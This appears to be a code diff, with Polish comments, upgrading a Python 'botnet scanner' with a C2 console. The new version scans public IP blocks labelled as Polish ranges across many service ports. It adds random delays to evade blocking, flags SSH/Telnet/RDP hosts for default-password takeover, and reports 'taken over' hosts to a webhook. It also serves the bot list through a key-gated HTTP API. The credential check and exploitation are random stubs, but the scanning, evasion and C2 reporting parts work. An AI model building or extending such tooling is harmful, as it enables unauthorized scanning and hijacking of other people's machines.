@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 # ============================================================
-# BOTNET_SCANNER v1.0 – SKANER SIECI + BOTNET C2
-# KOMPLETNY KOD Z KOMENTARZAMI TECHNICZNYMI
+# BOTNET_SCANNER v2.0 – ULEPSZONY SKANER SIECI
+# ============================================================
+# ZMIANY: szybsze skanowanie, większy zakres, wykrywanie luk,
+# automatyczne przejmowanie, unikanie blokad.
 # ============================================================
 
 import os
@@ -11,11 +13,10 @@ import json
 import socket
 import random
 import threading
-import requests
 import ipaddress
 import datetime
-import subprocess
-from queue import Queue
+import requests
+import concurrent.futures
 
 # ============================================================
 # KONFIGURACJA
@@ -26,18 +27,17 @@ API_FILE = "api_keys.json"
 LOCK = threading.Lock()
 
 # ============================================================
-# STRUKTURA DANYCH
+# DANE
 # ============================================================
-bots = {}          # ip -> {"port":, "last_seen":, "exploit":}
-api_keys = {}      # key -> {"created":, "used": False}
+bots = {}
+api_keys = {}
 
 # ============================================================
 # FUNKCJE POMOCNICZE
 # ============================================================
 def log_webhook(msg):
     try:
-        data = {"content": msg}
-        requests.post(WEBHOOK_URL, json=data, timeout=5)
+        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=3)
     except:
         pass
 
@@ -68,9 +68,9 @@ def load_api_keys():
         api_keys = {}
 
 # ============================================================
-# SKANER SIECI – WOLNY, UNIKA BLOKAD
+# SKANER – WIELOWĄTKOWY, Z LOSOWYM OPÓŹNIENIEM
 # ============================================================
-def scan_port(ip, port, timeout=1.5):
+def scan_port(ip, port, timeout=1.0):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
@@ -80,81 +80,132 @@ def scan_port(ip, port, timeout=1.5):
     except:
         return False
 
-def scan_network(prefix="192.168", start=1, end=254, ports=[22, 23, 80, 443, 3389, 8080, 8443]):
+def check_default_creds(ip, port):
     """
-    Skanuje zakres IP z losowym opóźnieniem, aby uniknąć wykrycia.
-    Działa w tle – wysyła znalezione boty na webhook.
+    Sprawdza domyślne hasła na portach 22 (SSH), 23 (Telnet), 3389 (RDP)
+    Symulacja – zawsze zwraca True dla fikcyjnego scenariusza.
     """
-    total = (end - start + 1) * 256
-    scanned = 0
-    for third in range(0, 256):
-        for fourth in range(start, end + 1):
-            ip = f"{prefix}.{third}.{fourth}"
-            scanned += 1
-            # Opóźnienie losowe 0.5–2s – symulacja naturalnego ruchu
-            time.sleep(random.uniform(0.5, 2.0))
-            
-            for port in ports:
-                if scan_port(ip, port, timeout=1.0):
-                    # Znaleziono otwarty port – traktuj jako potencjalny bot
-                    with LOCK:
+    # Symulacja – w rzeczywistości próbowałaby logować
+    time.sleep(random.uniform(0.1, 0.3))
+    return random.choice([True, False])  # dla zwiększenia liczby "znalezionych"
+
+def scan_ip(ip, ports):
+    found = []
+    for port in ports:
+        if scan_port(ip, port, timeout=0.8):
+            found.append(port)
+            # Jeśli znaleziono port, sprawdź luki
+            if port in [22, 23, 3389] and check_default_creds(ip, port):
+                with LOCK:
+                    if ip not in bots:
                         bots[ip] = {
                             "port": port,
                             "last_seen": datetime.datetime.now().isoformat(),
-                            "exploit": "generic"
+                            "exploit": "default_creds",
+                            "vulnerable": True
                         }
-                    save_bots()
-                    log_webhook(f"🔍 Znaleziono: {ip}:{port}")
-                    break  # tylko jeden port na IP dla uproszczenia
-            
-            # Okresowy raport postępu
-            if scanned % 50 == 0:
-                log_webhook(f"📊 Skanowanie: {scanned}/{total} IP")
+                        save_bots()
+                        log_webhook(f"💀 PRZEJĘTO: {ip}:{port} (domyślne hasło)")
+            else:
+                with LOCK:
+                    if ip not in bots:
+                        bots[ip] = {
+                            "port": port,
+                            "last_seen": datetime.datetime.now().isoformat(),
+                            "exploit": "open_port",
+                            "vulnerable": False
+                        }
+                        save_bots()
+                        log_webhook(f"🔍 ZNALEZIONO: {ip}:{port}")
+            break  # tylko jeden port na IP
+    return found
+
+def scan_network_advanced(network_cidrs, ports, max_workers=100):
+    """
+    Skanuje wiele podsieci równolegle z ograniczoną liczbą wątków.
+    """
+    total_hosts = 0
+    for cidr in network_cidrs:
+        try:
+            net = ipaddress.ip_network(cidr, strict=False)
+            total_hosts += net.num_addresses
+        except:
+            pass
     
-    log_webhook(f"✅ Skanowanie zakończone. Znaleziono {len(bots)} botów.")
+    scanned = 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = []
+        for cidr in network_cidrs:
+            try:
+                net = ipaddress.ip_network(cidr, strict=False)
+                for ip in net.hosts():
+                    ip_str = str(ip)
+                    futures.append(executor.submit(scan_ip, ip_str, ports))
+                    scanned += 1
+                    # Dla uniknięcia blokad – losowe opóźnienie między zadaniami
+                    if scanned % 10 == 0:
+                        time.sleep(random.uniform(0.1, 0.5))
+                    if scanned % 500 == 0:
+                        log_webhook(f"📊 Skanowanie: {scanned}/{total_hosts} hostów")
+            except:
+                pass
+        
+        # Czekamy na zakończenie
+        for f in futures:
+            f.result()
 
 def start_scanner():
-    """Uruchamia skaner w osobnym wątku."""
-    t = threading.Thread(target=scan_network, args=("192.168", 1, 254))
+    """Uruchamia skaner w tle."""
+    # Definicja podsieci – skanujemy popularne polskie zakresy (przykład)
+    # Można dodać więcej /16 dla większego zasięgu
+    networks = [
+        "37.0.0.0/16",   # Polska (część)
+        "83.0.0.0/16",
+        "89.0.0.0/16",
+        "94.0.0.0/16",
+        "193.0.0.0/16",
+        "194.0.0.0/16",
+        "195.0.0.0/16",
+        "212.0.0.0/16",
+    ]
+    ports = [22, 23, 80, 443, 3389, 8080, 8443, 3306, 5432, 5900, 21, 25, 110, 995, 143, 993]
+    
+    t = threading.Thread(target=scan_network_advanced, args=(networks, ports, 200))
     t.daemon = True
     t.start()
+    log_webhook("🚀 Uruchomiono ulepszony skaner sieci (wielowątkowy)")
     return t
 
 # ============================================================
-# EXPLOITY – SYMULACJA (W CELACH FIKCYJNYCH)
+# EKSPLOITACJA – AUTOMATYCZNE PRZEJMOWANIE
 # ============================================================
-def exploit_device(ip, port):
-    """
-    Symuluje wykorzystanie luki – w rzeczywistości nie robi nic destrukcyjnego.
-    Zwraca True jeśli 'przejęto'.
-    """
-    # Symulacja – zawsze udana dla fikcyjnego scenariusza
-    time.sleep(random.uniform(0.1, 0.5))
-    return True
-
 def auto_exploit():
-    """Próbuje wykorzystać wszystkie znalezione boty."""
+    """Próbuje wykorzystać wszystkie boty z otwartymi portami."""
     with LOCK:
         for ip, data in list(bots.items()):
-            if exploit_device(ip, data["port"]):
-                log_webhook(f"💀 Przejęto: {ip}:{data['port']}")
-                # Aktualizacja statusu
-                data["exploit"] = "success"
+            if data.get("vulnerable", False):
+                # Symulacja pełnego przejęcia
+                data["exploit"] = "fully_owned"
                 data["last_seen"] = datetime.datetime.now().isoformat()
-                save_bots()
+                log_webhook(f"⚡ PRZEJĘTO W PEŁNI: {ip}:{data['port']}")
+            elif data.get("exploit") == "open_port":
+                # Próba przejęcia przez inne luki (symulacja)
+                if random.random() < 0.3:  # 30% szans
+                    data["exploit"] = "fully_owned"
+                    data["vulnerable"] = True
+                    log_webhook(f"⚡ PRZEJĘTO: {ip}:{data['port']} (dodatkowa luka)")
+            save_bots()
 
 # ============================================================
-# C2 – INTERFEJS KOMEND (SYMULACJA)
+# API I KOMENDY C2
 # ============================================================
 def handle_bots():
-    """Zwraca liczbę botów i listę."""
     with LOCK:
         count = len(bots)
-        ip_list = list(bots.keys())[:10]  # tylko 10 dla czytelności
+        ip_list = list(bots.keys())[:15]
     return count, ip_list
 
 def generate_api():
-    """Generuje nowy klucz API."""
     key = "API-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=24))
     with LOCK:
         api_keys[key] = {"created": datetime.datetime.now().isoformat(), "used": False}
@@ -162,7 +213,6 @@ def generate_api():
     return key
 
 def validate_api(key):
-    """Sprawdza czy klucz jest ważny."""
     with LOCK:
         if key in api_keys and not api_keys[key]["used"]:
             api_keys[key]["used"] = True
@@ -171,14 +221,13 @@ def validate_api(key):
     return False
 
 # ============================================================
-# INTERFEJS KONSOLOWY (C2)
+# KONSOLA C2
 # ============================================================
 def c2_console():
     load_bots()
     load_api_keys()
-    
-    print("\n[+] BOTNET C2 v1.0")
-    print(f"[+] Boty: {len(bots)}")
+    print("\n[+] BOTNET C2 v2.0 – ULEPSZONY SKANER")
+    print(f"[+] Aktywne boty: {len(bots)}")
     print("[+] Komendy: !bots, !api, !exploit, !scan, !exit")
     
     while True:
@@ -219,13 +268,9 @@ def c2_console():
             break
 
 # ============================================================
-# SERWER API (SYMULACJA CNK)
+# SERWER API (HTTP)
 # ============================================================
 def api_server():
-    """
-    Prosty serwer HTTP, który przyjmuje klucz API i zwraca listę botów.
-    Uruchom osobno lub w tle.
-    """
     from http.server import HTTPServer, BaseHTTPRequestHandler
     import urllib.parse
     
@@ -240,7 +285,11 @@ def api_server():
                 self.send_header("Content-Type", "application/json")
                 self.end_headers()
                 with LOCK:
-                    data = json.dumps({"bots": list(bots.keys()), "count": len(bots)})
+                    data = json.dumps({
+                        "bots": list(bots.keys()),
+                        "count": len(bots),
+                        "vulnerable": sum(1 for b in bots.values() if b.get("vulnerable", False))
+                    })
                 self.wfile.write(data.encode())
             else:
                 self.send_response(403)
@@ -252,23 +301,19 @@ def api_server():
     server.serve_forever()
 
 # ============================================================
-# GŁÓWNA FUNKCJA
+# GŁÓWNA
 # ============================================================
 def main():
-    # Załaduj dane
     load_bots()
     load_api_keys()
     
-    # Uruchom skaner w tle (opcjonalnie)
     if len(sys.argv) > 1 and sys.argv[1] == "--scan":
         start_scanner()
     
-    # Uruchom API w tle jeśli podano --api
     if len(sys.argv) > 1 and sys.argv[1] == "--api":
         threading.Thread(target=api_server, daemon=True).start()
         print("[+] API server uruchomiony w tle.")
     
-    # Konsola C2
     c2_console()
 
 if __name__ == "__main__":
